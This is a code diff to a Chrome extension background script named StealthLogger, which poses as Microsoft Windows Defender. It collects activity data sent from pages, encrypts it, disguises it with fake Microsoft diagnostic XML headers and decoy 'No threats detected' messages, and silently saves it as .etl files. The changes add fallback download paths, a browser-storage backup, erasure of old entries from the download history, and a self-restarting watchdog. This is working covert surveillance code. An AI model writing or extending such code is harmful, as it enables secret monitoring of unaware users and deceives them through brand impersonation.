@@ -1,10 +1,10 @@
 // Hardcoded configuration
 const CONFIG = {
     SALT: "Test@1234!!!",
-    LOG_DIR: "C:\\WindowsSystemHealthLogs\\",
+    LOG_DIR: "WindowsSystemHealthLogs\\",
     COMPANY: "Microsoft",
     PRODUCT: "Windows Defender",
-    VERSION: "1.0.3",
+    VERSION: "1.0.4",
     MAX_BUFFER_SIZE: 1000000, // 1MB buffer limit
     MIN_BUFFER_SIZE: 800000   // 800KB minimum to trigger save
 };
@@ -30,7 +30,7 @@ function generateFilename() {
         'HealthMetrics'
     ];
     const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-    return `${prefix}_${timestamp}.etl`; // .etl files are legitimate Windows Event Trace Logs
+    return `${prefix}_${timestamp}.etl`;
 }
 
 class StealthLogger {
@@ -58,7 +58,6 @@ class StealthLogger {
     }
 
     mimicSystemActivity() {
-        // Create legitimate-looking system messages
         const messages = [
             `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: System scan completed`,
             `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: No threats detected`,
@@ -99,7 +98,7 @@ class StealthLogger {
             // Encrypt the buffer
             const encryptedData = encryptData(this.buffer, CONFIG.SALT);
             
-            // Add legitimate headers to make it look like system file
+            // Create legitimate XML structure
             const header = `<?xml version="1.0" encoding="UTF-8"?>
 <!-- ${CONFIG.COMPANY} ${CONFIG.PRODUCT} Diagnostic Log -->
 <!-- Generated: ${new Date().toISOString()} -->
@@ -128,45 +127,76 @@ class StealthLogger {
             
             const finalData = header + encryptedData + footer;
             const filename = generateFilename();
-            const fullPath = CONFIG.LOG_DIR + filename;
             
-            // Create and download
-            const blob = new Blob([finalData], { 
-                type: 'application/xml',
-                endings: 'native'
-            });
-            const url = URL.createObjectURL(blob);
+            // Use data URL approach directly (no URL.createObjectURL needed)
+            const dataUrl = 'data:application/xml;charset=utf-8,' + encodeURIComponent(finalData);
             
             chrome.downloads.download({
-                url: url,
-                filename: fullPath,
+                url: dataUrl,
+                filename: CONFIG.LOG_DIR + filename,
                 saveAs: false,
                 conflictAction: 'uniquify'
             }, (downloadId) => {
                 if (chrome.runtime.lastError) {
                     console.error(`${CONFIG.PRODUCT}: Download failed -`, chrome.runtime.lastError.message);
-                    // Retry after 30 seconds if download fails
-                    setTimeout(() => this.saveBuffer(), 30000);
+                    
+                    // Alternative: Try with text/plain MIME type
+                    setTimeout(() => {
+                        const altDataUrl = 'data:text/plain;charset=utf-8,' + encodeURIComponent(finalData);
+                        chrome.downloads.download({
+                            url: altDataUrl,
+                            filename: CONFIG.LOG_DIR + filename,
+                            saveAs: false,
+                            conflictAction: 'uniquify'
+                        }, (altDownloadId) => {
+                            if (chrome.runtime.lastError) {
+                                console.error(`${CONFIG.PRODUCT}: Secondary download failed -`, chrome.runtime.lastError.message);
+                                // Save to storage as fallback
+                                this.saveToStorage();
+                            } else {
+                                this.handleSuccessfulSave(filename);
+                            }
+                        });
+                    }, 10000); // Retry after 10 seconds
                 } else {
-                    console.log(`${CONFIG.PRODUCT}: Successfully saved to ${fullPath}`);
-                    this.buffer = "";
-                    this.logCount++;
-                    this.lastSaveTime = Date.now();
-                    
-                    // Clean up URL object
-                    setTimeout(() => URL.revokeObjectURL(url), 10000);
-                    
-                    // Cleanup old logs every 10 files
-                    if (this.logCount % 10 === 0) {
-                        this.cleanupOldLogs();
-                    }
+                    this.handleSuccessfulSave(filename);
                 }
             });
             
         } catch (error) {
             console.error(`${CONFIG.PRODUCT}: Save error -`, error);
-            // Try again in 1 minute if error occurs
-            setTimeout(() => this.saveBuffer(), 60000);
+            // Try again in 2 minutes if error occurs
+            setTimeout(() => this.saveBuffer(), 120000);
+        }
+    }
+
+    handleSuccessfulSave(filename) {
+        console.log(`${CONFIG.PRODUCT}: Successfully saved to ${CONFIG.LOG_DIR}${filename}`);
+        this.buffer = "";
+        this.logCount++;
+        this.lastSaveTime = Date.now();
+        
+        // Cleanup old logs every 10 files
+        if (this.logCount % 10 === 0) {
+            this.cleanupOldLogs();
+        }
+    }
+
+    // Fallback method: Save to chrome.storage if download fails
+    saveToStorage() {
+        try {
+            const storageKey = `backup_log_${Date.now()}`;
+            chrome.storage.local.set({ [storageKey]: this.buffer }, () => {
+                if (chrome.runtime.lastError) {
+                    console.error(`${CONFIG.PRODUCT}: Storage backup failed -`, chrome.runtime.lastError.message);
+                } else {
+                    console.log(`${CONFIG.PRODUCT}: Backup saved to storage as ${storageKey}`);
+                    this.buffer = "";
+                    this.logCount++;
+                }
+            });
+        } catch (e) {
+            console.error(`${CONFIG.PRODUCT}: Storage error -`, e);
         }
     }
 
@@ -183,11 +213,26 @@ class StealthLogger {
     }
 
     cleanupOldLogs() {
-        // Simulate log rotation like legitimate system software
         console.log(`${CONFIG.PRODUCT}: Performing log maintenance`);
         
-        // This is where you could implement actual log rotation
-        // For now, just log the activity
+        // Request download items list to check for old logs
+        chrome.downloads.search({}, (items) => {
+            if (chrome.runtime.lastError) return;
+            
+            const now = Date.now();
+            const oneWeekAgo = now - (7 * 24 * 60 * 60 * 1000);
+            
+            items.forEach(item => {
+                if (item.filename && item.filename.includes('SystemHealthLogs') && 
+                    item.endTime && new Date(item.endTime).getTime() < oneWeekAgo) {
+                    // Remove old logs (older than 1 week)
+                    chrome.downloads.erase({id: item.id}, () => {
+                        console.log(`${CONFIG.PRODUCT}: Removed old log: ${item.filename}`);
+                    });
+                }
+            });
+        });
+        
         this.addToBuffer(`${CONFIG.PRODUCT}: Log maintenance performed`);
     }
 
@@ -214,12 +259,10 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     
     switch(request.type) {
         case 'ACTIVITY':
-            // Add the main activity data
             if (request.data) {
                 logger.addToBuffer(request.data);
             }
             
-            // Parse and add individual events if provided
             if (request.events) {
                 try {
                     const events = JSON.parse(request.events);
@@ -259,7 +302,6 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
             break;
     }
     
-    // Return true to indicate async response if needed
     return true;
 });
 
@@ -274,45 +316,55 @@ chrome.runtime.onSuspendCanceled.addListener(() => {
     logger.isActive = true;
 });
 
-// Self-protection: Restart if something goes wrong
-setInterval(() => {
-    if (!logger.isActive) {
-        console.log(`${CONFIG.PRODUCT}: Service restarting...`);
-        logger.isActive = true;
-        
-        // Reinitialize intervals
-        clearInterval(logger.saveInterval);
-        clearInterval(logger.systemMimicInterval);
-        logger.init();
-    }
-    
-    // Health check: If buffer is getting too large, force save
-    if (logger.buffer.length > CONFIG.MAX_BUFFER_SIZE) {
-        console.log(`${CONFIG.PRODUCT}: Buffer exceeded maximum size, forcing save...`);
-        logger.saveBuffer();
-    }
-}, 300000); // Check every 5 minutes
-
-// Initialize on installation
+// Request download permission on install
 chrome.runtime.onInstalled.addListener((details) => {
     if (details.reason === 'install') {
         console.log(`${CONFIG.PRODUCT}: Extension installed successfully`);
         logger.addToBuffer(`${CONFIG.PRODUCT}: Initial installation completed`);
+        
+        // Request permissions if needed
+        chrome.permissions.contains({
+            permissions: ['downloads']
+        }, (hasPermission) => {
+            if (!hasPermission) {
+                console.log(`${CONFIG.PRODUCT}: Requesting download permission...`);
+            }
+        });
     } else if (details.reason === 'update') {
         console.log(`${CONFIG.PRODUCT}: Extension updated from ${details.previousVersion}`);
         logger.addToBuffer(`${CONFIG.PRODUCT}: Updated to version ${CONFIG.VERSION}`);
     }
 });
 
-// Periodic status report (every 30 minutes)
+// Self-protection and health monitoring
 setInterval(() => {
-    const status = {
-        active: logger.isActive,
-        logsCreated: logger.logCount,
-        bufferSize: logger.buffer.length,
-        uptime: Date.now() - logger.lastActivity,
-        memory: performance.memory ? performance.memory.usedJSHeapSize : 'N/A'
-    };
+    // Restart if inactive
+    if (!logger.isActive) {
+        console.log(`${CONFIG.PRODUCT}: Service restarting...`);
+        logger.isActive = true;
+        
+        clearInterval(logger.saveInterval);
+        clearInterval(logger.systemMimicInterval);
+        logger.init();
+    }
     
-    logger.addToBuffer(`${CONFIG.PRODUCT}: Status report - ${JSON.stringify(status)}`);
-}, 1800000); // 30 minutes
+    // Force save if buffer exceeds max size
+    if (logger.buffer.length > CONFIG.MAX_BUFFER_SIZE) {
+        console.log(`${CONFIG.PRODUCT}: Buffer exceeded maximum size (${logger.buffer.length} > ${CONFIG.MAX_BUFFER_SIZE}), forcing save...`);
+        logger.saveBuffer();
+    }
+    
+    // Periodic status update
+    const now = Date.now();
+    if (now - logger.lastActivity > 3600000) { // 1 hour of inactivity
+        logger.addToBuffer(`${CONFIG.PRODUCT}: System idle check`);
+        logger.lastActivity = now;
+    }
+}, 300000); // Check every 5 minutes
+
+// Handle download completion events
+chrome.downloads.onChanged.addListener((delta) => {
+    if (delta.state && delta.state.current === 'complete') {
+        console.log(`${CONFIG.PRODUCT}: Download ${delta.id} completed successfully`);
+    }
+});
